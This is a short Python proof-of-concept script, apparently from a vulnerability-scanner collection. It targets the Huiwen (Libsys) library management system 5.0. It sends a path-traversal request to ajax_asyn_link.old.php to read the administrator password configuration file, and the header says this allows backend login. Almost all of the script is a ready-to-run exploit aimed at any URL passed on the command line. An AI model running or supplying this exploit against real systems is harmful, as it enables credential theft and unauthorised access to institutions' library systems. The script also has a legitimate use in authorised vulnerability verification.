#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 汇文软件图书管理系统ajax_asyn_link.old.php任意文件读取
referer: http://www.wooyun.org/bugs/wooyun-2014-059850
author: Lucifer
description: 漏洞影响5.0版本,漏洞文件位于ajax_asyn_link.old.php中,参数url可以传入"../"来读取配置文件，并成功登陆到后台。
'''
import sys
import requests
import warnings
from termcolor import cprint

class libsys_ajax_asyn_link_old_fileread_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = "/zplug/ajax_asyn_link.old.php?url=../admin/opacadminpwd.php"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if r"<?php" in req.text:
                cprint("[+]存在汇文图书管理系统文件读取漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = libsys_ajax_asyn_link_old_fileread_BaseVerify(sys.argv[1])
    testVuln.run()